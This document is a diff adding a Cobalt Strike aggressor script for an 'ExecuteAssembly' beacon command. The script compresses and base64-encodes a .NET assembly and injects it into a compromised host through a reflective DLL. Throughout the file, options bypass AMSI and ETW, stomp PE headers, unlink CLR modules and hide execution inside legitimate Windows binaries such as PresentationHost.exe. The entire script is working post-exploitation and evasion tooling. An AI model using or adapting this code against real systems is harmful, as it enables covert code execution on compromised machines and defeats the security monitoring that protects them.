@@ -1,0 +1,203 @@
+#Author: med0x2e
+
+
+#Help
+beacon_command_register("ExecuteAssembly", "Loads/Execute .NET assemblies",
+  "\n- Description:\n\tLoads/Injects .NET assemblies by reusing existing loaded CLR, Stomping PE headers, Unlinking .NET related modules,\n\t bypassing ETW, AMSI and dynamically resolving APIs via superfasthash hashing algorithm. \n\n" .
+  "- Usage/Example:\n\tExecuteAssembly --dotnetassembly /tmp/Seatbelt.exe --assemblyargs LogonSessions --unlink-modules --stomp-headers --amsi --etw --spawnto PresentationHost.exe\n\n- Options:\n\t--dotnetassembly: .NET Assembly to load/inject.\n\t--assemblyargs: .NET assembly arguments.\n\t--unlink-modules: Unlink .NET related modules such as CLR/MsCoree related DLLs from PEB data structures.\n\t--stomp-headers: Stomp .NET assembly and reflective DLL PE DOS headers.\n\t--etw: Bypass event tracing on windows (ETW).\n\t--amsi: Bypass AMSI.\n\t--spawnto: Choose spawnto process, list of .NET binaries loading the CLR by default when executed:\n\t\t>'PresentationHost.exe'\n\t\t>'stordiag.exe'\n\t\t>'ScriptRunner.exe'\n\t\t>'caitstatic.exe'\n\t\t>'Microsoft.Uev.SyncController.exe'\n\t\t>'TsWpfWrp.exe'\n\t\t>'UevAgentPolicyGenerator.exe'\n\t\t>'UevAppMonitor.exe'\n\t\t>'FileHistory.exe'\n\t\t>'UevTemplateBaselineGenerator.exe'\n\t\t>'UevTemplateConfigItemGenerator.exe'");
+
+alias ExecuteAssembly {
+
+  #-------------------------------------- Extract/Parse Arguments  --------------------------------------#
+    $max_num_params = 30;
+    $data = substr($0, 16);
+    @args = split(' ', $data); 
+    
+    %options["unlinkmodules"] = 0;
+    %options["stompheaders"] = 0;
+    %options["etw"] = 0;
+    %options["amsi"] = 0;
+
+    $spawntoProcess = "";
+    $dotNetAssembly = "";
+    @dotNetAssemblyArgs = @();
+
+
+    @CliOptions = @("--unlink-modules", "--stomp-headers", "--amsi", "--etw", "--spawnto", "--dotnetassembly", "--assemblyargs");
+
+    for ($i = 0; $i < size(@args); $i++){
+
+      if (@args[$i] iswm "--unlink-modules") {
+         %options["unlinkmodules"] = 1;
+      }else if (@args[$i] iswm "--stomp-headers"){
+         %options["stompheaders"] = 1; 
+      } else if (@args[$i] iswm "--etw"){
+         %options["etw"] = 1;
+      }else if (@args[$i] iswm "--amsi"){
+         %options["amsi"] = 1;
+      }else if (@args[$i] iswm "--spawnto"){
+        $i = $i + 1;
+        $spawntoProcess = @args[$i]; 
+      }else if (@args[$i] iswm "--dotnetassembly"){
+        $i = $i + 1;
+        $dotNetAssembly = @args[$i];
+      }else if (@args[$i] iswm "--assemblyargs"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @dotNetAssemblyArgs[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one signle argument (disregarding spaces).
+              if(('"' isin @dotNetAssemblyArgs[$count] || "'" isin @dotNetAssemblyArgs[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@dotNetAssemblyArgs[$count], '"') == (strlen(@dotNetAssemblyArgs[$count]) - 1) || lindexOf(@dotNetAssemblyArgs[$count], "'") == (strlen(@dotNetAssemblyArgs[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @dotNetAssemblyArgs[$count] = @dotNetAssemblyArgs[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @dotNetAssemblyArgs[$count] = @dotNetAssemblyArgs[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+        }
+      }
+    }
+  #------------------------------------------------------------------------------------------------------#
+
+
+  #-------------------------------------- Error Handling  --------------------------------------#
+
+    $assemblyPath = $dotNetAssembly;
+    $bid = $1;
+    if ($assemblyPath eq "") {
+      berror($bid, "Run 'help ExecuteAssembly'\n");
+      return;
+    }
+
+    if (!-exists $assemblyPath || !-isFile $assemblyPath){
+      berror($bid, "File ".$assemblyPath." doesn't exist\n");
+      return;
+    }
+  
+  #-----------------------------------------------------------------------------------------------#
+
+
+
+  #-------------------------------------- Compressing and base64 encoding assembly  --------------------------------------#
+
+    btask($1, "Tasked beacon to run: @args", "T1059");
+
+    #Reading assembly bytes and get the size in bytes
+    $assemblyLength = lof($assemblyPath);
+    $assemblyPPath = getFileParent($assemblyPath);
+
+    $gzippedAssemblyPath = $assemblyPath.".gz";
+
+    #Compressing assembly
+    $gzipHandle = exec("gzip -k ".$assemblyPath);
+    wait($gzipHandle);
+    closef($gzipHandle);
+
+    $gzAssemblyHandle = openf($gzippedAssemblyPath);
+    $gzAssemblyBytes = readb($gzAssemblyHandle, -1);
+    closef($gzAssemblyHandle);
+
+    #cleanup
+    deleteFile($gzippedAssemblyPath);
+
+    if(int(strlen($gzAssemblyBytes)) == 0){
+      berror($bid, "Something went wrong with compression/base64-encoding, make sure that you have write access to the folder you're loading .NET assemblies from & gzip is installed.\n");
+      return;
+    }
+
+    #B64 encoding assembly
+    $assemblyWithArgs = base64_encode($gzAssemblyBytes);
+
+   #---------------------------------------------------------------------------------------------------------------------#
+  
+  
+  #-------------------------------------- Appending .NET assembly arguments --------------------------------------#
+  
+    #Appending .NET assembly arguments to $assemblyWithArgs var (separated by " ")
+    for ($i = 0; $i < size(@dotNetAssemblyArgs); $i++){
+      if (@dotNetAssemblyArgs[$i] ne "") {
+         $assemblyWithArgs = $assemblyWithArgs." ".@dotNetAssemblyArgs[$i];
+      }
+    }
+
+  #---------------------------------------------------------------------------------------------------------------#
+
+
+
+  #-------------------------------------- Prepending %options flags (amsi, etw ..etc) + Length, LLength  --------------------------------------#
+  
+    $assemblyWithArgs = strlen($assemblyLength).$assemblyLength.$assemblyWithArgs;
+
+    #prepend ETW, AMSI, ModuleUnlinking and PE DOS headers stamping boolean values.
+    $assemblyWithArgs = %options["unlinkmodules"]."|".$assemblyWithArgs;
+    $assemblyWithArgs = %options["stompheaders"]."|".$assemblyWithArgs;
+    $assemblyWithArgs = %options["etw"]."|".$assemblyWithArgs;
+    $assemblyWithArgs = %options["amsi"]."|".$assemblyWithArgs;
+
+    #Final Payload: AMSI_FLAG|ETW_FLAG|STOMPHEADERS_FLAG|UNLINKMODULES_FLAG|LL_FLAG.LENGH_FLAG.B64_ENCODED_COMPRESSED_PAYLOAD [SPACE SEPARATED ARGUMENTS]
+
+  #---------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+  #--------------------------------------
+
+    #Add size check here should be less than 1 MB (To add).
+
+  #--------------------------------------
+
+
+
+  #-------------------------------------- Setting spawnto & Loading DLL and passing arguments --------------------------------------#
+
+    # List of common/legitimate .NET binaries loading/using CLR when executed, just use one of these as a spawnto exe. (Default set to presentationhost.exe)
+    @netBinaries = @("PresentationHost.exe", "stordiag.exe", "ScriptRunner.exe", "caitstatic.exe", "Microsoft.Uev.SyncController.exe","TsWpfWrp.exe","UevAgentPolicyGenerator.exe","UevAppMonitor.exe", "FileHistory.exe", "UevTemplateBaselineGenerator.exe","UevTemplateConfigItemGenerator.exe", "tzsync.exe");
+
+    #Change this based on the previous list or using --spawnto switch
+
+    $x86_spawnToProcessPath = "%windir%\\SysWOW64\\" ;
+    $x64_spawnToProcessPath = "%windir%\\sysnative\\" ;
+
+    if($spawntoProcess eq ""){
+      $x86_spawnToProcessPath = $x86_spawnToProcessPath.@netBinaries[0] ;
+      $x64_spawnToProcessPath = $x64_spawnToProcessPath.@netBinaries[0] ;
+    }else{
+      $x86_spawnToProcessPath = $x86_spawnToProcessPath.$spawntoProcess ;
+      $x64_spawnToProcessPath = $x64_spawnToProcessPath.$spawntoProcess ;
+    }
+
+    bspawnto($1, "x86", $x86_spawnToProcessPath);
+    bspawnto($1, "x64", $x64_spawnToProcessPath);
+
+    if (barch($1) eq "x64") {
+          bdllspawn($1, script_resource("ExecuteAssembly-x64.dll"), $assemblyWithArgs, ".NET Assembly ".$assemblyPath."'", 5000, true);
+    }else{
+          bdllspawn($1, script_resource("ExecuteAssembly-x86.dll"), $assemblyWithArgs, ".NET Assembly '".$assemblyPath."'", 5000, true);
+    }
+
+  #------------------------------------------------------------------------------------------------------------------------------#
+
+}
+
+  
